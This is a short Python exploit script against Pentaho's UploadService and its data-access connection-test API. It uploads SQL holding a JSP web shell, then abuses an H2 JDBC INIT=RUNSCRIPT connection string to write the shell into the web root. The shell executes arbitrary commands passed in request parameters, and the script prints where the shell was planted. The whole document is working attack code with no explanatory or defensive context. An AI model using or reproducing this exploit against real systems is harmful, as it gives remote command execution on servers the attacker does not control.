host = "localhost"

d = """CREATE TABLE test (
     id VARCHAR NOT NULL
);

INSERT INTO TEST VALUES ('
<%
  java.io.InputStream in = Runtime.getRuntime().exec(request.getParameterNames().nextElement()).getInputStream();
  int a = -1;
  byte[] b = new byte[2048];
  while((a=in.read(b)) != -1) {
    out.println(new String(b));
  }
%>
');
CALL CSVWRITE('../webapps/ROOT/PLACEHOLDER', 'SELECT * FROM test');"""

from secrets import token_hex
path = token_hex(16) + ".jsp"
d = d.replace("PLACEHOLDER", path)

from requests import put,post

r = post(f"http://{host}/pentaho/UploadService?file_name=sql.txt&mark_temporary=false&unzip=false", data={"uploadFormElement": d})
if r.status_code != 200:
  print("failed")
  exit()
r = put(f"http://{host}/pentaho/plugin/data-access/api/connection/test", json={"usingConnectionPool":false,"maximumPoolSize":20,"connectSql":"","name":"test","attributes":{"CUSTOM_URL":"jdbc:h2:mem:1337;INIT=RUNSCRIPT FROM '../../pentaho-solutions/system/metadata/csvfiles/sql.txt'","CUSTOM_DRIVER_CLASS":"org.h2.Driver"},"connectionPoolingProperties":{},"extraOptions":{},"extraOptionsOrder":{},"accessType":"NATIVE","databaseType":{"defaultDatabasePort":-1,"name":"Generic database","shortName":"GENERIC","supportedAccessTypes":["NATIVE","ODBC","JNDI"]}})
if r.status_code != 200:
  print("failed")
  exit()

print(f"webshell at {path}")